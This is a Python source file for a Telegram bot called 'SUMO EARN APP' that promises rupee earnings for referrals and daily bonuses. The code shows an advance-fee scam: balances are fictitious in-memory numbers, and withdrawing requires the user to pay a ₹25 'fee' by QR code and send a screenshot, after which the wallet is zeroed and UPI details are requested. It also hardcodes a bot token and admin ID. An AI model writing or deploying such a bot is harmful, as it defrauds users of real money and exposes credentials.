import telebot
from telebot.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8270412566:AAGx_B6UDmksBnfrROKkjhyKBuhEMx0Vi7c"
ADMIN_ID = 7156406347

bot = telebot.TeleBot(TOKEN)

# ---------------- DATABASE ----------------
users = {}
wallet = {}
referrals = {}
pending_withdraw = {}
awaiting_screenshot = {}

REF_BONUS = 25
DAILY_BONUS = 10
MIN_WITHDRAW = 125


# ---------------- MENU (COLORFUL APP STYLE) ----------------
def menu():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row("💰 Wallet", "🔗 Referral")
    m.row("🎁 Bonus", "🏆 Leaderboard")
    m.row("💸 Withdraw")
    return m


# ---------------- START ----------------
@bot.message_handler(commands=['start'])
def start(msg):
    uid = msg.from_user.id
    name = msg.from_user.first_name

    if uid not in users:
        users[uid] = name
        wallet[uid] = 0
        referrals[uid] = 0

    args = msg.text.split()

    if len(args) > 1:
        try:
            ref_id = int(args[1])

            if ref_id != uid and ref_id in users:
                wallet[ref_id] = wallet.get(ref_id, 0) + REF_BONUS
                referrals[ref_id] = referrals.get(ref_id, 0) + 1

                bot.send_message(ref_id, f"""
🌈✨ REFERRAL SUCCESS ✨🌈

🎉 Bonus Earned: +₹{REF_BONUS}
💎 Keep Inviting Friends!
""")

        except:
            pass

    bot.send_message(uid, f"""
🌈━━━━━━━━━━━━━━━━━━━🌈
💎 SUMO EARN APP
🌈━━━━━━━━━━━━━━━━━━━🌈

👤 NAME: {name}

💰 WALLET
₹{wallet[uid]}

👥 REFERRALS
{referrals[uid]}

🌈━━━━━━━━━━━━━━━━━━━🌈
🚀 START EARNING NOW
🌈━━━━━━━━━━━━━━━━━━━🌈
""", reply_markup=menu())


# ---------------- WALLET ----------------
@bot.message_handler(func=lambda m: m.text == "💰 Wallet")
def wallet_view(msg):
    uid = msg.from_user.id

    bot.send_message(uid, f"""
💎━━━━━━━━━━━━━━━━━━━💎
💳 WALLET PANEL
💎━━━━━━━━━━━━━━━━━━━💎

💰 BALANCE: ₹{wallet.get(uid,0)}
👥 REFERRALS: {referrals.get(uid,0)}

💎━━━━━━━━━━━━━━━━━━━💎
""")


# ---------------- REF LINK ----------------
@bot.message_handler(func=lambda m: m.text == "🔗 Referral")
def ref_link(msg):
    uid = msg.from_user.id
    link = f"https://t.me/{bot.get_me().username}?start={uid}"

    bot.send_message(uid, f"""
🌟━━━━━━━━━━━━━━━━━━━🌟
🔗 REFERRAL LINK
🌟━━━━━━━━━━━━━━━━━━━🌟

{link}

💸 Earn ₹{REF_BONUS} per invite
🌟━━━━━━━━━━━━━━━━━━━🌟
""")


# ---------------- BONUS ----------------
@bot.message_handler(func=lambda m: m.text == "🎁 Bonus")
def bonus(msg):
    uid = msg.from_user.id
    wallet[uid] = wallet.get(uid,0) + DAILY_BONUS

    bot.send_message(uid, f"""
🎁✨ BONUS RECEIVED ✨🎁

💰 +₹{DAILY_BONUS} added instantly
🔥 Keep playing daily!
""")


# ---------------- LEADERBOARD ----------------
@bot.message_handler(func=lambda m: m.text == "🏆 Leaderboard")
def leaderboard(msg):

    if not referrals:
        bot.send_message(msg.chat.id, "NO DATA YET")
        return

    sorted_users = sorted(referrals.items(), key=lambda x: x[1], reverse=True)

    text = """
🏆✨ TOP EARNERS ✨🏆

"""

    i = 1

    for uid, ref in sorted_users[:5]:
        name = users.get(uid, "User")
        text += f"{i}. {name} ⭐ {ref} refs\n"
        i += 1

    bot.send_message(msg.chat.id, text)


# ---------------- WITHDRAW ----------------
@bot.message_handler(func=lambda m: m.text == "💸 Withdraw")
def withdraw(msg):
    uid = msg.from_user.id
    bal = wallet.get(uid, 0)

    if bal < MIN_WITHDRAW:
        bot.send_message(uid, f"""
❌ WITHDRAW FAILED

Minimum: ₹{MIN_WITHDRAW}
Your Balance: ₹{bal}
""")
        return

    pending_withdraw[uid] = bal
    awaiting_screenshot[uid] = True

    bot.send_message(uid, f"""
💸✨ WITHDRAW REQUEST ✨💸

💰 BALANCE: ₹{bal}

📌 FEE: ₹25

📲 Scan QR below
""")

    try:
        with open("qr.png", "rb") as qr:
            bot.send_photo(uid, qr)
    except:
        bot.send_message(uid, "QR NOT FOUND")

    bot.send_message(uid, "📸 Send payment screenshot")


# ---------------- SCREENSHOT ----------------
@bot.message_handler(content_types=['photo'])
def screenshot(msg):
    uid = msg.from_user.id

    if uid in awaiting_screenshot:

        awaiting_screenshot.pop(uid)

        bot.forward_message(ADMIN_ID, msg.chat.id, msg.message_id)

        kb = InlineKeyboardMarkup()
        kb.add(
            InlineKeyboardButton("✅ APPROVE", callback_data=f"ap_{uid}"),
            InlineKeyboardButton("❌ REJECT", callback_data=f"re_{uid}")
        )

        bot.send_message(ADMIN_ID, f"""
💼 WITHDRAW REQUEST

👤 User: {users.get(uid)}
💰 Amount: ₹{pending_withdraw.get(uid,0)}
""", reply_markup=kb)

        bot.send_message(uid, """
⏳ PAYMENT UNDER REVIEW
Admin verifying your request...
""")


# ---------------- ADMIN ----------------
@bot.callback_query_handler(func=lambda call: call.from_user.id == ADMIN_ID)
def callback(call):
    data = call.data

    if data.startswith("ap_"):
        uid = int(data.split("_")[1])

        wallet[uid] = 0
        pending_withdraw.pop(uid, None)

        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("📩 Admin Chat", url="https://t.me/Taskman96"))

        bot.send_message(uid, """
🎉 PAYMENT APPROVED  
💰 Send your details to admin  

UPI ID  
Name  
""", reply_markup=kb)

    elif data.startswith("re_"):
        uid = int(data.split("_")[1])

        pending_withdraw.pop(uid, None)

        bot.send_message(uid, """
❌ PAYMENT REJECTED
Please try again
""")

# ---------------- RUN ----------------
bot.polling()
